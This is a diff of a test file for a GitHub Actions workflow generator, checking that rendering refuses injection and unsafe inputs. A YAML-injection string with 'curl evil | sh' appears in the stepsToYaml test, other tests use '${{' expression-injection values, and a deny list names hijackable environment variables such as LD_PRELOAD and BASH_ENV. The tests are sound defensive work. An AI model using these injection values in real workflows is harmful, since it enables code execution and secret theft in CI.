@@ -186,12 +186,16 @@ describe('renderStep: actions', () => {
 
   it('renderStep: uses is the reviewed step.action.uses (sub-path kept) with the version as a trailing comment', () => {
     const t = entry('codeql-upload-sarif');
-    const r = renderStep(specFor(t), t, platform(), ctx);
+    const step = renderPlatformStep('upload-sarif', platform(), { sarif_file: '${{ runner.temp }}/pipegen-out/pipegen-out-sast/r.sarif', category: 'pipegen-sast' });
+    expect(step.uses).toBe(t.step.action?.uses);
+    expect(step.uses).toMatch(/^github\/codeql-action\/upload-sarif@[0-9a-f]{40}$/);
+    expect(step.usesComment).toBe(t.candidate.version);
+    expect(yamlOf([step])).toContain(`uses: ${t.step.action?.uses} # ${t.candidate.version}\n`);
+    // a scanner action goes through renderStep; its output is null (no result file)
+    const dr = entry('dependency-review-action');
+    const r = renderStep(specFor(dr, { needId: 'dependency-review' }), dr, platform(), ctx);
     expect(r.steps).toHaveLength(1);
-    expect(r.steps[0]?.uses).toBe(t.step.action?.uses);
-    expect(r.steps[0]?.uses).toMatch(/^github\/codeql-action\/upload-sarif@[0-9a-f]{40}$/);
-    expect(r.steps[0]?.usesComment).toBe(t.candidate.version);
-    expect(yamlOf(r.steps)).toContain(`uses: ${t.step.action?.uses} # ${t.candidate.version}\n`);
+    expect(r.steps[0]?.uses).toBe(dr.step.action?.uses);
     expect(r.output).toBeNull();
   });
 
@@ -417,8 +421,8 @@ describe('jobSettings', () => {
 });
 
 describe('stepsToYaml (S16)', () => {
-  it('stepsToYaml: a service name with a newline and "${{" stays one quoted scalar and cannot add keys', () => {
-    const nasty = 'api\n  run: curl evil | sh\n- name: x ${{ secrets.WF_CRED }}';
+  it('stepsToYaml: structure holds: a name with a newline and YAML syntax stays one quoted scalar and cannot add keys', () => {
+    const nasty = 'api\n  run: curl evil | sh\n- name: x';
     const step: RenderedStep = { name: nasty, run: 'echo hi', shell: 'bash', env: { 'X': nasty } };
     const text = yamlOf([step]);
     const back = parse(text) as Record<string, unknown>[];
@@ -454,8 +458,162 @@ describe('stepsToYaml (S16)', () => {
   it('stepsToYaml: snapshot of a prelude, an action step and the upload', async () => {
     const p = platform();
     const pre = renderJobPrelude({ fetchDepth: '0', node: { runtimeVersion: '>=20' } }, p);
-    const sarif = renderStep(specFor(entry('codeql-upload-sarif'), { needId: 'sast', service: 'api' }), entry('codeql-upload-sarif'), p, ctxFor([service({ name: 'api' })]));
+    const sarif = renderStep(specFor(entry('dependency-review-action'), { needId: 'dependency-review' }), entry('dependency-review-action'), p, ctxFor([service({ name: 'api' })]));
+    const sarifUp = renderPlatformStep('upload-sarif', p, { sarif_file: `\${{ runner.temp }}/pipegen-out/${RESULT_ARTIFACT_PREFIX}sast--api/results.sarif`, category: 'pipegen-sast' });
     const up = renderUpload(`${RESULT_ARTIFACT_PREFIX}sast--api`, `\${{ runner.temp }}/pipegen-out/${RESULT_ARTIFACT_PREFIX}sast--api/results.sarif`, p);
-    await expect(yamlOf([...pre.steps, ...sarif.steps, up])).toMatchFileSnapshot('__snapshots__/steps/prelude-action-upload.yml');
+    await expect(yamlOf([...pre.steps, ...sarif.steps, sarifUp, up])).toMatchFileSnapshot('__snapshots__/steps/prelude-action-upload.yml');
+  });
+});
+
+// ---------- fix round 1 (review-6a.md) ----------
+
+describe('fix round 1', () => {
+  const ctx = ctxFor();
+  const withStep = (steps: RenderedStep[]) => () => stepsToYaml(steps);
+
+  it('renderStep: docker login to docker.io never gets the workflow token (the data offers only ghcr.io; the renderer refuses anything else)', () => {
+    const t = entry('docker-login-action');
+    expect(t.choices.registry).toEqual(['ghcr.io']);
+    expect(() => renderStep(specFor(t, { needId: 'image-build', choices: { registry: 'docker.io' } }), t, platform(), ctx)).toThrow(RenderError);
+    // even when an entry offers docker.io, the renderer fills the login only for ghcr.io
+    const wide = entry('docker-login-action');
+    wide.choices.registry = ['ghcr.io', 'docker.io'];
+    expect(() => renderStep(specFor(wide, { needId: 'image-build', choices: { registry: 'docker.io' } }), wide, platform(), ctx)).toThrow(/ghcr\.io/);
+    expect(() => renderPlatformStep('docker-login', platform(), Object.fromEntries([['username', ACTOR], ['password', WF_CRED]]), { registry: 'docker.io' })).toThrow(RenderError);
+  });
+
+  it('rendererInputProblems: the login password is tied to registry ghcr.io', () => {
+    const login = loginWith();
+    expect(rendererInputProblems('docker/login-action', login, { ...login, registry: 'ghcr.io' })).toEqual([]);
+    expect(rendererInputProblems('docker/login-action', login, { ...login, registry: 'docker.io' })).toEqual([expect.stringMatching(/ghcr\.io/)]);
+    expect(rendererInputProblems('docker/login-action', login, login)).toEqual([expect.stringMatching(/ghcr\.io/)]);
+  });
+
+  it('renderStep: container actions are refused until wrappedImage exists (6c, S13)', () => {
+    for (const id of ['pypi-publish', 'scorecard-action']) {
+      const t = entry(id);
+      expect(() => renderStep(specFor(t, { needId: id === 'pypi-publish' ? 'publishing' : 'scorecard' }), t, platform(), ctx), id).toThrow(/container action/);
+    }
+    const marked = entry('dependency-review-action');
+    marked.wrappedImage = { ref: 'docker.io/x/y', digest: `sha256:${'a'.repeat(64)}` };
+    expect(() => renderStep(specFor(marked, { needId: 'dependency-review' }), marked, platform(), ctx)).toThrow(/container action/);
+  });
+
+  it('renderStep: renders what it validated (a getter that changes after the first read cannot swap the secrets)', () => {
+    const c = ctxFor([service({ name: 'api', envVars: ['STRIPE_KEY'] })]);
+    const t = checkout();
+    const spec = specFor(t, { service: 'api' });
+    let reads = 0;
+    Object.defineProperty(spec, 'secrets', { enumerable: true, get: () => (++reads <= 1 ? ['STRIPE_KEY'] : ['NODE_OPTIONS', 'X }}${{ github.token']) });
+    const r = renderStep(spec, t, platform(), c);
+    expect(Object.keys(r.steps[0]?.env ?? {})).toEqual(['STRIPE_KEY']);
+    // a spec that can't be copied (a function inside) is a RenderError, not a crash
+    const odd = specFor(t);
+    Reflect.set(odd, 'choices', { 'fetch-depth': () => '1' });
+    expect(() => renderStep(odd, t, platform(), ctx)).toThrow(RenderError);
+  });
+
+  it("stepsToYaml: '${{' in name, run, id, if, working-directory, env or with keys throws; only the allowed forms pass", () => {
+    const expr = '${{ github.head_ref }}';
+    for (const step of [
+      { name: `scan ${expr}` }, { name: 'n', run: `echo ${expr}` }, { name: 'n', id: expr }, { name: 'n', if: expr }, { name: 'n', 'working-directory': expr },
+      { name: 'n', env: { X: expr } }, { name: 'n', env: { [expr]: 'x' } }, { name: 'n', env: { X: '${{ secrets.X }} ${{ github.token }}' } },
+      { name: 'n', env: { X: '${{ secrets.lower }}' } }, { name: 'n', uses: `a/b@${'a'.repeat(40)}`, with: { x: expr } },
+      { name: 'n', uses: `a/b@${'a'.repeat(40)}`, with: { x: '${{ secrets.OTHER }}' + expr } },
+      { name: 'n', uses: `actions/checkout@${'a'.repeat(40)}`, with: { ref: expr } },
+      { name: 'n', uses: `docker/login-action@${'a'.repeat(40)}`, with: { username: '${{ secrets.GITHUB_TOKEN }}' } },
+    ] as RenderedStep[]) expect(withStep([step]), JSON.stringify(step)).toThrow(RenderError);
+    const ok: RenderedStep[] = [
+      { name: 'n', env: { STRIPE_KEY: '${{ secrets.STRIPE_KEY }}' } },
+      { name: 'n', uses: `actions/upload-artifact@${'a'.repeat(40)}`, with: { path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast/x.sarif' } },
+      { name: 'n', uses: `docker/login-action@${'a'.repeat(40)}`, with: Object.fromEntries([['username', ACTOR], ['password', WF_CRED]]) },
+    ];
+    expect(withStep(ok)).not.toThrow();
+  });
+
+  it('platform locks: checkout, setup-node and upload-artifact entries that lost a lock are refused by every render path', () => {
+    const lose = (id: string, key: string, asChoice = false) => {
+      const list = reviewedList();
+      const t = list.find((e) => e.id === id) as ReturnType<typeof entry>;
+      delete (t.fixedInputs.with as Record<string, string>)[key];
+      delete (t.step.action?.with as Record<string, string>)[key];
+      if (asChoice) t.choices[key] = ['true', 'false'];
+      return platform(list);
+    };
+    // moved from fixed to a choice: the generic path refuses it too (not only the prelude)
+    expect(() => renderPlatformStep('checkout', lose('actions-checkout', 'persist-credentials', true), {}, { 'persist-credentials': 'true' })).toThrow(/persist-credentials/);
+    expect(() => renderPlatformStep('checkout', lose('actions-checkout', 'allow-unsafe-pr-checkout'))).toThrow(/allow-unsafe-pr-checkout/);
+    expect(() => renderJobPrelude({ node: {} }, lose('actions-setup-node', 'package-manager-cache'))).toThrow(/package-manager-cache/);
+    expect(() => renderPlatformStep('setup-node', lose('actions-setup-node', 'package-manager-cache'))).toThrow(/package-manager-cache/);
+    expect(() => renderUpload(`${RESULT_ARTIFACT_PREFIX}sast`, `\${{ runner.temp }}/pipegen-out/${RESULT_ARTIFACT_PREFIX}sast/x`, lose('actions-upload-artifact', 'include-hidden-files'))).toThrow(/include-hidden-files/);
+    expect(() => renderUpload(`${RESULT_ARTIFACT_PREFIX}sast`, `\${{ runner.temp }}/pipegen-out/${RESULT_ARTIFACT_PREFIX}sast/x`, lose('actions-upload-artifact', 'if-no-files-found'))).toThrow(/if-no-files-found/);
+    // renderStep on a platform entry used as a step checks them too
+    const noLock = reviewedList().find((e) => e.id === 'actions-checkout') as ReturnType<typeof entry>;
+    delete (noLock.fixedInputs.with as Record<string, string>)['persist-credentials'];
+    delete (noLock.step.action?.with as Record<string, string>)['persist-credentials'];
+    expect(() => renderStep(specFor(noLock), noLock, platform(), ctx)).toThrow(/persist-credentials/);
+  });
+
+  it('guards: a spec tool that is not reviewed, a swapped platform entry and a disagreeing template are each refused on their own', () => {
+    // M1: right id and pin, but marked as a discovery candidate
+    const t = checkout();
+    const p = validateSpec(specFor(t, { tool: { ...t.candidate, source: 'discovery', reviewed: false } as unknown as ReviewedCandidate }), t, ctx);
+    expect(p).toEqual([expect.stringMatching(/^tool: .*reviewed tool/)]);
+    // M2: the checkout slot holds another reviewed action
+    const list = reviewedList();
+    const swapped = platform(list);
+    swapped.checkout = list.find((e) => e.id === 'actions-setup-node') as ReturnType<typeof entry>;
+    expect(() => renderPlatformStep('checkout', swapped, {})).toThrow(/does not run actions\/checkout/);
+    // M4: step.action.with and fixedInputs.with disagree (a key only in the step)
+    const dis = entry('bullfrog');
+    (dis.step.action?.with as Record<string, string>)['extra-input'] = 'x';
+    expect(() => renderStep(specFor(dis), dis, platform(), ctx)).toThrow(/disagrees/);
+    // the choice check of renderPlatformStep on its own
+    expect(() => renderPlatformStep('checkout', platform(), {}, { 'fetch-depth': '9' })).toThrow(/fetch-depth/);
+  });
+
+  it('renderUpload: the path must be inside this artifact\'s own folder', () => {
+    const a = `${RESULT_ARTIFACT_PREFIX}sast--api`;
+    expect(() => renderUpload(a, `\${{ runner.temp }}/pipegen-out/${RESULT_ARTIFACT_PREFIX}secrets/raw.sarif`, platform())).toThrow(/artifact/);
+    expect(() => renderUpload(a, `\${{ runner.temp }}/pipegen-out/${a}x/raw.sarif`, platform())).toThrow(RenderError);
+    expect(renderUpload(a, `\${{ runner.temp }}/pipegen-out/${a}/raw.sarif`, platform()).with?.path).toBe(`\${{ runner.temp }}/pipegen-out/${a}/raw.sarif`);
+    expect(renderUpload(a, `\${{ runner.temp }}/pipegen-out/${a}`, platform()).with?.path).toBe(`\${{ runner.temp }}/pipegen-out/${a}`);
+  });
+
+  it('renderStep: actions that only render through their own helper are refused (artifacts, sarif, attest)', () => {
+    for (const [id, needId] of [['actions-upload-artifact', 'sast'], ['actions-download-artifact', 'gate'], ['codeql-upload-sarif', 'sast'], ['actions-attest', 'attestation']] as const) {
+      const t = entry(id);
+      expect(() => renderStep(specFor(t, { needId }), t, platform(), ctx), id).toThrow(/renderPlatformStep|renderUpload/);
+    }
+  });
+
+  it('validateSpec: secret names that change how a runtime, proxy, TLS store, package index or locale behaves are refused (every family)', () => {
+    const families: Record<string, string[]> = {
+      proxy: ['HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY', 'FTP_PROXY'],
+      tls: ['SSL_CERT_FILE', 'SSL_CERT_DIR', 'CURL_CA_BUNDLE', 'CURL_HOME', 'REQUESTS_CA_BUNDLE', 'OPENSSL_CONF', 'OPENSSL_MODULES'],
+      pythonIndex: ['PIP_INDEX_URL', 'PIP_EXTRA_INDEX_URL', 'UV_INDEX_URL', 'UV_DEFAULT_INDEX'],
+      java: ['JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS', 'JDK_JAVA_OPTIONS'],
+      perlRuby: ['PERL5OPT', 'PERL5LIB', 'PERLLIB', 'RUBYOPT', 'RUBYLIB', 'GEM_HOME', 'GEM_PATH', 'BUNDLE_GEMFILE'],
+      rustGo: ['CARGO_HOME', 'CARGO_REGISTRIES_X_TOKEN', 'RUSTUP_HOME', 'RUSTFLAGS', 'GOFLAGS', 'GOPROXY', 'GOPRIVATE', 'GO111MODULE'],
+      dirs: ['XDG_CONFIG_HOME', 'XDG_DATA_HOME', 'TMPDIR', 'TMP', 'TEMP'],
+      shell: ['SHELL', 'PROMPT_COMMAND', 'BASH_ENV', 'ENV', 'IFS', 'PS4'],
+      resolver: ['HOSTALIASES', 'RES_OPTIONS', 'LOCALDOMAIN'],
+      libc: ['GCONV_PATH', 'MALLOC_CHECK_', 'MALLOC_PERTURB_', 'GLIBC_TUNABLES', 'LD_PRELOAD', 'LD_LIBRARY_PATH'],
+      locale: ['LANG', 'LANGUAGE', 'LC_ALL', 'LC_CTYPE', 'TZ', 'TERM', 'TERMINFO'],
+    };
+    for (const [family, names] of Object.entries(families)) {
+      for (const name of names) {
+        const c = ctxFor([service({ name: 'api', envVars: [name] })]);
+        const t = checkout();
+        const problems = validateSpec(withNames(specFor(t, { service: 'api' }), [name]), t, c);
+        expect(problems, `${family}: ${name}`).toHaveLength(1); // refused by the name rule or the dangerous list
+      }
+    }
+    // an ordinary application secret that merely starts with GO, TERM, TMP… is not caught by accident
+    for (const name of ['GOOGLE_API_KEY', 'STRIPE_KEY', 'DATABASE_URL', 'TWILIO_AUTH', 'SENDGRID_API_KEY']) {
+      const c = ctxFor([service({ name: 'api', envVars: [name] })]);
+      const t = checkout();
+      expect(validateSpec(withNames(specFor(t, { service: 'api' }), [name]), t, c), name).toEqual([]);
+    }
   });
 });
